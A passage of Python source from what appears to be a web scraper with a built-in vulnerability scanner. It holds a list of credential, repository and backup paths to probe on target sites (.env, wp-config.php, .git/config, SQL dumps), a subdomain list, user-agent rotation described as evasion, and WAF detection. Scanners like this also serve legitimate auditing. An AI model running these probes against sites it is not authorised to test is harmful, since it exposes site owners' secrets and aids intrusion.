                    endpoint["risk"]   += 30
                    return endpoint

                if 'json' in ct or body.startswith(('{', '[')):
                    endpoint["type"]    = "JSON_API"
                    endpoint["preview"] = body[:150]
                    # GraphQL detection
                    if '/graphql' in url.lower() or ('"data"' in body and '"errors"' in body):
                        endpoint["type"]  = "GRAPHQL"
                        endpoint["risk"] += 20
                    # OpenAPI / Swagger inline JSON
                    elif '"openapi"' in body or '"swagger"' in body:
                        endpoint["type"]    = "API_DOCS"
                        endpoint["preview"] = "OpenAPI/Swagger JSON"
                        endpoint["risk"]   += 10
                    # ── Probe write methods on JSON endpoints ──
                    try:
                        hr = requests.head(url, headers=_get_headers(), timeout=4, verify=False)
                        allow_h = hr.headers.get('Allow', '') or hr.headers.get('Access-Control-Allow-Methods', '')
                        if allow_h:
                            endpoint["allow_methods"] = allow_h[:80]
                            if any(m in allow_h.upper() for m in ("PUT","PATCH","DELETE")):
                                endpoint["risk"] += 25
                                endpoint["allow_methods"] += " ⚠️WRITE"
                    except Exception:
                        pass
                elif 'xml' in ct or 'rss' in ct or 'atom' in ct:
                    endpoint["type"]    = "XML/RSS"
                    endpoint["preview"] = body[:100]
                elif 'html' in ct and any(k in url for k in ('/swagger', '/redoc', '/docs', '/api-ui')):
                    endpoint["type"]    = "API_DOCS"
                    endpoint["preview"] = "Swagger/OpenAPI docs"
                    endpoint["risk"]   += 10
                elif url.endswith(('.env', '.config', '.yml', '.yaml', '.json', '.conf', '.xml')) \
                        and size < 200_000:
                    endpoint["type"]    = "CONFIG_LEAK"
                    endpoint["preview"] = body[:120]
                    endpoint["risk"]   += 40
                elif size > 20:
                    endpoint["type"]    = "OTHER"
                    endpoint["preview"] = body[:80]
                else:
                    return None
                return endpoint
        except Exception as _e:
            logging.debug("Scan error: %s", _e)
        return None

    # ── Probe paths (profile-ordered) ────────────
    all_probe_paths = list(ordered_paths)
    # Add mined paths (path-only) at the end
    for mined_url in (html_mined + js_mined + robots_found):
        try:
            p = urlparse(mined_url).path
            if p and p not in all_probe_paths and len(p) < 150:
                all_probe_paths.append(p)
        except Exception as _e:
            logging.debug("Scan error: %s", _e)

    # ── Source-map path detection ─────────────────
    # Add .map variants for common JS bundle paths
    _extra_map_paths = []
    for p in all_probe_paths[:]:
        if p.endswith('.js') and len(_extra_map_paths) < 30:
            _extra_map_paths.append(p + '.map')

    # Add .map source file probes
    all_probe_paths.extend(_extra_map_paths)

    total = len(all_probe_paths)
    if progress_cb:
        progress_cb(
            f"🔌 Path scanning: `{total}` paths "
            f"[{profile.profile_name}] ×`{api_workers}` workers..."
        )

    with concurrent.futures.ThreadPoolExecutor(max_workers=api_workers) as ex:
        fmap = {ex.submit(_probe, path): path for path in all_probe_paths}
        done = 0
        try:
            for fut in concurrent.futures.as_completed(fmap, timeout=120):
                done += 1
                try:
                    result = fut.result(timeout=8)
                    if result and result["url"] not in seen:
                        seen.add(result["url"])
                        found.append(result)
                except Exception:
                    pass
                if progress_cb and done % 15 == 0:
                    progress_cb(
                        f"🔌 Scanning: `{done}/{total}`\n"
                        f"✅ JSON: `{sum(1 for e in found if e['type']=='JSON_API')}` | "
                        f"🔒 Protected: `{sum(1 for e in found if e['type']=='PROTECTED')}` | "
                        f"📰 RSS: `{sum(1 for e in found if e['type']=='XML/RSS')}`"
                    )
                if probe_delay > 0:
                    time.sleep(probe_delay)
        except concurrent.futures.TimeoutError:
            # Timeout — cancel remaining, return partial results
            for f in fmap:
                f.cancel()
            if progress_cb:
                progress_cb(
                    f"⚠️ Scan timeout — partial results\n"
                    f"✅ Completed: `{done}/{total}` | Found: `{len(found)}`"
                )

    _type_order = {"JSON_API": 0, "GRAPHQL": 1, "XML/RSS": 2,
                   "API_DOCS": 3, "CONFIG_LEAK": 4, "SOURCE_MAP": 5,
                   "PROTECTED": 6, "OTHER": 7}
    found.sort(key=lambda x: _type_order.get(x["type"], 9))

    return {
        "found":       found,
        "js_mined":    list(set(js_mined)),
        "html_mined":  list(set(html_mined)),
        "robots":      robots_found,
        "stats": {
            "total_probed":   total,
            "json_apis":      sum(1 for e in found if e["type"] == "JSON_API"),
            "graphql":        sum(1 for e in found if e["type"] == "GRAPHQL"),
            "xml_rss":        sum(1 for e in found if e["type"] == "XML/RSS"),
            "api_docs":       sum(1 for e in found if e["type"] == "API_DOCS"),
            "config_leaks":   sum(1 for e in found if e["type"] == "CONFIG_LEAK"),
            "source_maps":    sum(1 for e in found if e["type"] == "SOURCE_MAP"),
            "protected":      sum(1 for e in found if e["type"] == "PROTECTED"),
            "other":          sum(1 for e in found if e["type"] == "OTHER"),
            "js_urls_found":  len(js_mined),
            "html_urls_found":len(html_mined),
        }
    }



def _normalize_url(url: str) -> str:
    """Normalize URL: strip trailing slash, lowercase scheme+host, remove fragment."""
    p = urlparse(url)
    path = p.path.rstrip('/') or '/'
    return p._replace(scheme=p.scheme.lower(), netloc=p.netloc.lower(),
                       path=path, fragment='').geturl()


def get_internal_links(html: str, base_url: str, soup=None) -> set:
    if soup is None:
        soup = BeautifulSoup(html, _BS_PARSER)
    netloc  = urlparse(base_url).netloc.lower()
    links   = set()
    for a in soup.find_all('a', href=True):
        h = a['href']
        if h.startswith(('#','mailto:','tel:','javascript:')): continue
        full = urljoin(base_url, h)
        p    = urlparse(full)
        if p.netloc.lower() == netloc:
            links.add(_normalize_url(full))  # V30: normalize to avoid duplicates
    return links



# ══════════════════════════════════════════════════
# ✂️  FILE SPLITTER
# ══════════════════════════════════════════════════

def split_zip(zip_path: str, part_mb: float = SPLIT_MB) -> list:
    part_size = int(part_mb * 1024 * 1024)
    base  = zip_path.replace('.zip','')
    parts = []
    num   = 1
    with open(zip_path,'rb') as f:
        while True:
            chunk = f.read(part_size)
            if not chunk: break
            p = f"{base}.part{num:02d}.zip"
            with open(p,'wb') as pf: pf.write(chunk)
            parts.append(p)
            num += 1
    return parts

def needs_split(path: str) -> bool:
    return os.path.getsize(path) > SPLIT_MB * 1024 * 1024


# ══════════════════════════════════════════════════
# 🛡️  VULNERABILITY SCANNER  v4
#     - Cloudflare catch-all detection
#     - Baseline fingerprint comparison
#     - Adaptive delay (anti-rate-limit)
#     - Real subdomain verification
# ══════════════════════════════════════════════════

_COMMON_SUBDOMAINS = [
    "api", "admin", "dev", "staging", "test",
    "beta", "app", "portal", "dashboard", "panel",
    "manage", "backend", "internal", "static",
    "mail", "backup", "vpn", "git", "gitlab",
    "jenkins", "ci", "build", "docs", "help",
    "shop", "store", "blog", "status", "monitor",
    "db", "database", "phpmyadmin", "cdn", "media",
    "assets", "files", "upload", "img", "images",
    "auth", "login", "sso", "oauth", "api2",
]

_VULN_PATHS = [
    # CRITICAL — Credentials
    ("/.env",                     "🔑 .env file",               "CRITICAL"),
    ("/.env.local",               "🔑 .env.local",              "CRITICAL"),
    ("/.env.backup",              "🔑 .env.backup",             "CRITICAL"),
    ("/.env.production",          "🔑 .env.production",         "CRITICAL"),
    ("/wp-config.php",            "🔑 wp-config.php",           "CRITICAL"),
    ("/wp-config.php.bak",        "🔑 wp-config.php.bak",       "CRITICAL"),
    ("/config.php",               "🔑 config.php",              "HIGH"),
    ("/config.yml",               "🔑 config.yml",              "HIGH"),
    ("/config.json",              "🔑 config.json",             "HIGH"),
    ("/database.yml",             "🔑 database.yml",            "HIGH"),
    ("/settings.py",              "🔑 settings.py",             "HIGH"),
    # CRITICAL — VCS
    ("/.git/config",              "📁 .git/config",             "CRITICAL"),
    ("/.git/HEAD",                "📁 .git/HEAD",               "CRITICAL"),
    ("/.svn/entries",             "📁 .svn entries",            "HIGH"),
    # CRITICAL — Backups
    ("/backup.zip",               "🗜️ backup.zip",              "CRITICAL"),
    ("/backup.sql",               "🗜️ backup.sql",              "CRITICAL"),
    ("/dump.sql",                 "🗜️ dump.sql",                "CRITICAL"),
    ("/db.sql",                   "🗜️ db.sql",                  "CRITICAL"),
    ("/backup.tar.gz",            "🗜️ backup.tar.gz",           "CRITICAL"),
    ("/site.zip",                 "🗜️ site.zip",                "HIGH"),
    # HIGH — Admin panels
    ("/phpmyadmin/",              "🔐 phpMyAdmin",              "HIGH"),
    ("/pma/",                     "🔐 phpMyAdmin /pma/",        "HIGH"),
    ("/adminer.php",              "🔐 Adminer DB UI",           "HIGH"),
    ("/admin",                    "🔐 Admin Panel",             "MEDIUM"),
    ("/admin/",                   "🔐 Admin Panel",             "MEDIUM"),
    ("/admin/login",              "🔐 Admin Login",             "MEDIUM"),
    ("/wp-admin/",                "🔐 WordPress Admin",         "MEDIUM"),
    ("/administrator/",           "🔐 Joomla Admin",            "MEDIUM"),
    ("/dashboard",                "🔐 Dashboard",               "MEDIUM"),
    ("/login",                    "🔐 Login Page",              "LOW"),
    # HIGH — Logs
    ("/error.log",                "📋 error.log",               "HIGH"),
    ("/access.log",               "📋 access.log",              "HIGH"),
    ("/debug.log",                "📋 debug.log",               "HIGH"),
    ("/storage/logs/laravel.log", "📋 Laravel log",             "HIGH"),
    # MEDIUM — Server info
    ("/server-status",            "⚙️ Apache server-status",   "MEDIUM"),
    ("/web.config",               "⚙️ web.config",             "HIGH"),
    ("/.htaccess",                "⚙️ .htaccess",              "MEDIUM"),
    ("/xmlrpc.php",               "⚠️ xmlrpc.php",             "MEDIUM"),
    # LOW
    ("/composer.json",            "📦 composer.json",           "LOW"),
    ("/package.json",             "📦 package.json",            "LOW"),
    ("/requirements.txt",         "📦 requirements.txt",        "LOW"),
    # INFO
    ("/robots.txt",               "🤖 robots.txt",              "INFO"),
    ("/sitemap.xml",              "🗺️ sitemap.xml",             "INFO"),
]

_SEV_EMOJI = {"CRITICAL":"🔴","HIGH":"🟠","MEDIUM":"🟡","LOW":"🔵","INFO":"⚪"}
_SEV_ORDER = {"CRITICAL":0,"HIGH":1,"MEDIUM":2,"LOW":3,"INFO":4}
_SEC_HEADERS = {
    "Strict-Transport-Security": ("HSTS",           "HIGH"),
    "Content-Security-Policy":   ("CSP",            "MEDIUM"),
    "X-Frame-Options":           ("X-Frame-Options","MEDIUM"),
    "X-Content-Type-Options":    ("X-Content-Type", "LOW"),
    "Referrer-Policy":           ("Referrer-Policy","LOW"),
    "Permissions-Policy":        ("Permissions-Policy","LOW"),
}
_FAKE_SIGS = [
    b"404", b"not found", b"page not found",
    b"does not exist", b"no such file",
]

# User-Agents rotation (avoid rate limiting) — 60+ UAs for better evasion (updated 2025/2026)
_UA_LIST = [
    # ── Chrome — Windows (latest) ────────────────────────────────────
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
    # ── Chrome — Windows (slightly older, still common) ──────────────
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.185 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.216 Safari/537.36',
    # ── Chrome — macOS ───────────────────────────────────────────────
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    # ── Chrome — Linux ───────────────────────────────────────────────
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    # ── Firefox — Windows ────────────────────────────────────────────
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0',
    # ── Firefox — macOS ──────────────────────────────────────────────
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:138.0) Gecko/20100101 Firefox/138.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14.5; rv:136.0) Gecko/20100101 Firefox/136.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 13.6; rv:128.0) Gecko/20100101 Firefox/128.0',
    # ── Firefox — Linux ──────────────────────────────────────────────
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0',
    'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0',
    'Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0',
    # ── Safari — macOS ───────────────────────────────────────────────
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
    # ── Edge — Windows ───────────────────────────────────────────────
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
    # ── Mobile — Android Chrome ──────────────────────────────────────
    'Mozilla/5.0 (Linux; Android 15; Pixel 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.60 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.85 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.6998.135 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.6943.137 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; Pixel 7a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.107 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.60 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.85 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.107 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; OnePlus 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.6834.79 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; RMX3890) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.200 Mobile Safari/537.36',
    # ── Mobile — iOS Safari ──────────────────────────────────────────
    'Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
    # ── iPad ─────────────────────────────────────────────────────────
    'Mozilla/5.0 (iPad; CPU OS 18_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1',
    # ── Opera ─────────────────────────────────────────────────────────
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 OPR/115.0.0.0',
    # ── Brave (Chrome-based) ──────────────────────────────────────────
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    # ── Mobile Firefox ───────────────────────────────────────────────
    'Mozilla/5.0 (Android 15; Mobile; rv:138.0) Gecko/138.0 Firefox/138.0',
    'Mozilla/5.0 (Android 14; Mobile; rv:136.0) Gecko/136.0 Firefox/136.0',
    'Mozilla/5.0 (Android 14; Mobile; rv:128.0) Gecko/128.0 Firefox/128.0',
    # ── Samsung Internet ─────────────────────────────────────────────
    'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/27.0 Chrome/125.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/24.0 Chrome/117.0.0.0 Mobile Safari/537.36',
]


def _get_headers() -> dict:
    """Rotate User-Agent each call with realistic browser headers."""
    ua = random.choice(_UA_LIST)
    is_mobile = 'Mobile' in ua or 'Android' in ua or 'iPhone' in ua or 'iPad' in ua
    return {
        'User-Agent': ua,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': random.choice([
            'en-US,en;q=0.9', 'en-GB,en;q=0.9', 'en-US,en;q=0.5',
            'en-US,en;q=0.9,fr;q=0.8', 'en-US,en;q=0.9,de;q=0.8',
        ]),
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Cache-Control': 'max-age=0',
        **({"Sec-CH-UA-Mobile": "?1"} if is_mobile else {"Sec-CH-UA-Mobile": "?0"}),
    }


# ══════════════════════════════════════════════════
# 🔍  SITE PROFILE DETECTOR  — Adaptive download
# ══════════════════════════════════════════════════

_PROFILE_CACHE: dict = {}   # {domain: SiteProfile} — session-level cache

class SiteProfile:
    """
    Detected characteristics of a target website.
    Used to adapt download behavior for best results.
    """
    __slots__ = (
        'is_cloudflare', 'is_spa', 'is_wordpress', 'is_shopify',
        'is_static', 'has_waf', 'crawl_delay', 'accepts_gzip',
        'server', 'tech_hints',
        # Adaptive settings derived from profile
        'asset_workers', 'page_delay', 'req_delay', 'chunk_size',
        'suggest_js', 'profile_name',
    )

    def __init__(self):
        self.is_cloudflare  = False
        self.is_spa         = False
        self.is_wordpress   = False
        self.is_shopify     = False
        self.is_static      = False
        self.has_waf        = False
        self.crawl_delay    = 0.0
        self.accepts_gzip   = True
        self.server         = ''
        self.tech_hints     = []
        # Defaults (override in _apply_profile_settings)
        self.asset_workers  = 25           # 10 → 25
        self.page_delay     = 0.0
        self.req_delay      = 0.0
        self.chunk_size     = 65536
        self.suggest_js     = False
        self.profile_name   = 'Normal'

    def _apply_profile_settings(self):
        """Set adaptive download parameters based on detected profile."""
        if self.is_cloudflare or self.has_waf:
            self.asset_workers = 6             # 4 → 6
            self.req_delay     = 0.2
            self.page_delay    = 0.3
            self.profile_name  = 'Cloudflare/WAF'
        elif self.is_shopify:
            self.asset_workers = 10            # 6 → 10
            self.req_delay     = 0.15
            self.profile_name  = 'Shopify'
        elif self.is_wordpress:
            self.asset_workers = 15            # 8 → 15
            self.req_delay     = 0.05
            self.profile_name  = 'WordPress'
        elif self.is_spa:
            self.asset_workers = 20            # 12 → 20
            self.req_delay     = 0.0
            self.suggest_js    = True
            self.profile_name  = 'SPA (React/Vue/Next)'
        elif self.is_static:
            self.asset_workers = 30            # 15 → 30
            self.req_delay     = 0.0
            self.profile_name  = 'Static Site'
        else:
            self.asset_workers = 25            # 10 → 25
            self.req_delay     = 0.02
            self.profile_name  = 'Normal'

        # Crawl-delay from robots.txt always respected
        if self.crawl_delay > 0:
            self.page_delay = max(self.page_delay, self.crawl_delay)

    def summary(self) -> str:
        tags = []
        if self.is_cloudflare: tags.append("☁️ CF")
        if self.has_waf:       tags.append("🛡️ WAF")
        if self.is_spa:        tags.append("⚛️ SPA")
        if self.is_wordpress:  tags.append("📝 WP")
        if self.is_shopify:    tags.append("🛍️ Shopify")
        if self.is_static:     tags.append("📄 Static")
        tag_str = " ".join(tags) if tags else "🌐 Normal"
        return (
            f"{tag_str} | Workers: `{self.asset_workers}` | "
            f"Delay: `{self.req_delay:.2f}s`"
        )


def detect_site_profile(url: str) -> SiteProfile:
    """
    Probe a URL once and return a SiteProfile with adaptive settings.
    Results are cached per domain for the session.
    """
    domain = urlparse(url).netloc
    if domain in _PROFILE_CACHE:
        return _PROFILE_CACHE[domain]

    profile = SiteProfile()

    try:
        resp = requests.get(
            url, headers=_get_headers(),
            timeout=12, verify=False,
            allow_redirects=True,
            stream=True
        )
        # Read minimal content for fingerprinting
        buf = io.BytesIO()
        for chunk in resp.iter_content(8192):
            buf.write(chunk)
            if buf.tell() >= 32768:  # 32KB enough for detection
                break
        resp.close()
        body = buf.getvalue().decode('utf-8', 'replace').lower()
        hdrs = {k.lower(): v.lower() for k, v in resp.headers.items()}

        # ── Server / CDN detection ─────────────────
        server = hdrs.get('server', '')
        profile.server = server

        # Cloudflare
        if ('cloudflare' in server or 'cf-ray' in hdrs or
                'cf-cache-status' in hdrs or '__cfduid' in hdrs.get('set-cookie','')):
            profile.is_cloudflare = True

        # Generic WAF signals
        waf_headers = ('x-sucuri-id', 'x-firewall-protection', 'x-waf',
                       'x-defended-by', 'x-shield', 'x-powered-by-akamai')
        if any(h in hdrs for h in waf_headers):
            profile.has_waf = True
        if 'x-sucuri' in str(hdrs):
            profile.has_waf = True

        # ── CMS / Framework detection ──────────────
        # WordPress
        if ('wp-content/' in body or 'wp-includes/' in body or
                'wordpress' in body or '/wp-json/' in body):
            profile.is_wordpress = True

        # Shopify
        if ('cdn.shopify.com' in body or 'shopify.theme' in body or
                'myshopify.com' in hdrs.get('x-shopify-stage','') or
                'shopify' in hdrs.get('x-powered-by','')):
            profile.is_shopify = True

        # SPA frameworks (React / Vue / Next / Nuxt / Angular)
        spa_signals = (
            '__next_data__', '/_next/static/', '__nuxt__', '/_nuxt/',
            '__vue__', 'data-v-', 'ng-version=', '__reactfiber',
            'react-dom.production', 'react.development',
            'window.__initial_state__', 'window.__redux_state__',
        )
        if sum(1 for s in spa_signals if s in body) >= 1:
            profile.is_spa = True

        # Static site (no dynamic signals)
        dynamic_signals = ('php', 'asp', 'jsp', 'django', 'rails', 'laravel',
                           'wp-content', 'powered by')
        if not any(s in body for s in dynamic_signals) and not profile.is_spa:
            profile.is_static = True

        # ── robots.txt crawl-delay ─────────────────
        try:
            parsed   = urlparse(url)
            root     = f"{parsed.scheme}://{parsed.netloc}"
            rb       = requests.get(f"{root}/robots.txt", timeout=5,
                                    headers=_get_headers(), verify=False)
            if rb.status_code == 200:
                for line in rb.text.lower().splitlines():
                    if line.startswith('crawl-delay:'):
                        try:
                            profile.crawl_delay = float(line.split(':', 1)[1].strip())
                        except Exception:
                            pass
                        break
        except Exception as _e:
            logging.debug("Scan error: %s", _e)

    except Exception as e:
        logger.debug("Site profile detection failed: %s", e)

    profile._apply_profile_settings()
    _PROFILE_CACHE[domain] = profile
    logger.info("Site profile [%s]: %s", domain, profile.summary())
    return profile


def _get_page_fingerprint(url: str, timeout: int = 6) -> tuple:
    """
